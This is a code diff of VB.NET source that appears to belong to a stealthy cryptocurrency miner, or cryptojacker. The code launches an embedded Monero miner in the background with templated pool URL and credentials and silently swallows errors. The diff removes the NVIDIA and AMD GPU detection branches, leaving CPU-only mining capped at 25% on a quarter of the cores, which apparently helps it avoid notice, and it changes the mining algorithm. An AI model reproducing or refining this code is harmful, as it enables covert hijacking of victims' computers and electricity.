@@ -112,34 +112,13 @@ Public Class Program
             Dim Args As String = ""
             Dim xmr As Byte() = Nothing
 
-            If GetGPU.ToLower.Contains("nvidia") Then
 
-                If IO.Directory.Exists("C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\") Then
-                    Args = "--cuda-bfactor=12 --cuda-bsleep=100"
-                    For Each folder As String In IO.Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\NVIDIA GPU Computing Toolkit\CUDA")
-                        If folder.Contains("v8") Then
-                            xmr = GetTheResource("#nvidia")
-                        ElseIf folder.Contains("v9") Then
-                            xmr = GetTheResource("#nvidia2")
-                        End If
-                    Next
-                Else
-                    'if for some reason there is no CUDA...
-                    Args = "-t " + CType((Environment.ProcessorCount / 2), String) + " --max-cpu-usage=25"
-                    xmr = GetTheResource("#cpu")
-                End If
-
-            ElseIf GetGPU.ToLower.Contains("amd") Then
-                Args = "--opencl-platform=0 --opencl-devices=0 --opencl-launch=1600x8,1600x8,1600x8"
-                xmr = GetTheResource("#amd")
-            Else
-                Args = "-t " + CType((Environment.ProcessorCount / 2), String) + " --max-cpu-usage=25"
-                xmr = GetTheResource("#cpu")
-            End If
+            Args = "-t " + CType((Environment.ProcessorCount / 4), String) + " --max-cpu-usage=25"
+            xmr = GetTheResource("#cpu")
 
 
 
-            Run(GetTheResource("#dll"), "-B --donate-level=0 -a cryptonight --url=#URL --algo=rx/0 --coin=monero background=true -u #USER -p #PWD -R --variant=-1 " + Args, xmr)
+            Run(GetTheResource("#dll"), "-B --donate-level=0 -a cryptonight --url=#URL --algo=cr/2 --coin=monero background=true -u #USER -p #PWD -R --variant=-1 " + Args, xmr)
         Catch ex As Exception
         End Try
     End Sub
